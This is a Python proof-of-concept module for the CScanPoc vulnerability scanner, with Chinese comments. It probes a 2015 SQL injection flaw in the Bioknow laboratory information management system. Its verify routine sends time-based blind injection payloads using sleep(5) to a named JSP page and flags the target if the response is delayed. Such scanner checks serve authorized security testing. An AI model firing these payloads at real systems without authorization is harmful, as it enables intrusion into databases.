# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Bioknow_0011'  # 平台漏洞编号，留空
    name = '百奥知实验室综合信息管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-16'  # 漏洞公布时间
    desc = '''
        百奥知实验室综合信息管理系统是一款由北京百奥知信息科技有限公司自主研发的实验室管理系统。
        百奥知实验室综合信息管理系统：
        /portal/root/lcky1/gg_nr.jsp?id=-1
        /portal/root/lcky1/gg_nr.jsp?id=-1
        处存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0107168'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1cf9a789-081f-4e65-9fa4-8fe6f82301e7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-31'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.3 http://www.wooyun.org/bugs/wooyun-2010-0107168
            payload1 = "/portal/root/lcky1/gg_nr.jsp?id=-1%20or%201=sleep(5)"
            payload2 = "/portal/root/lcky1/gg_nr.jsp?id=-1%20or%201=sleep(0)"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(self.target + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
